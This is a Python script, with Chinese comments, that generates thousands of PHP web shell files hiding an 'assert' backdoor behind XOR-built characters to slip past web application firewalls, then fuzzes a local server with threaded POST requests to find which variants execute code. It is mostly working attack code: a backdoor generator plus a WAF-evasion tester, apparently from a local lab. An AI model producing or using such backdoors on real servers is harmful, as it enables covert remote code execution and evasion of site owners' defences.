import requests
import time
import threading, queue


# ^是异或运算法
# 为什么使用异或运算符构造出我们的payload php assert木马
# 为了绕过waf的查杀 这就是传说中的无字符后门
# 不仅可以替代a字符 assert全部都可以替换
# 我们是否可以再打开一下思路 不仅可以利用异或 还可以利用& | 左移 右移 等所有位运算符

def attack():
    while not q.empty():
        filename = q.get()
        url = 'http://127.0.0.1:8081/x/' + filename
        datas = {
            'x': 'phpinfo();'
        }
        result = requests.post(url, data=datas).content.decode('utf-8')
        if 'XIAODI-PC' in result:
            print('已经找到可以攻击的payload')
            print('check->' + filename + '->ok')
        else:
            print('check->' + filename + '->no')
        time.sleep(1)


def single_attack():
    url = 'http://127.0.0.1:8081/x/33xd64.php'
    datas = {
        'x': 'phpinfo();'
    }
    result = requests.post(url, data=datas).content.decode('utf-8')
    print(result)
    if 'XIAODI-PC' in result:
        print('ok')
    else:
        print('check->' + filename + '->no')


# 这里是上传后门 上传到x目录下
# attack函数则找出能够绕过WAF的payload
if __name__ == '__main__':
    q = queue.Queue()
    for i in range(33, 127):
        for ii in range(33, 127):
            payload = "'" + chr(i) + "'" + '^' + "'" + chr(ii) + "'"
            code = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
            filename = str(i) + 'xd' + str(ii) + '.php'
            q.put(filename)
            with open('D:/phpstudy/PHPTutorial/WWW/x/' + filename, 'a') as f:
                f.write(code)
                f.close()
                print('Fuzz文件生成成功')
    for x in range(20):
        t = threading.Thread(target=attack)
        t.start()
